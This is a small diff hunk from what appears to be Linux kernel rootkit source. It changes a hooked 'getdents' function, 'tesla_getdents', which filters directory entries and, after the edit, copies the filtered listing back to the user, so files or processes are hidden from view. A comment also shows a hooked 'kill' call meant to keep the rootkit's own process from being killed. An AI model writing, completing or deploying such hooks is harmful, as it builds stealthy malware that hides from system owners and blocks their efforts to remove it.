@@ -58,9 +58,8 @@ asmlinkage long tesla_getdents(unsigned int fd, struct linux_dirent __user *dirp
 			i += p2->d_reclen;
 			p2 = (struct linux_dirent*)((char *)p2 + p2->d_reclen);
 		}
-		
-
 	}
+	copy_to_user(p1, dirp, count);
 }
 
 /* we intercept kill so that our process can not be killed */
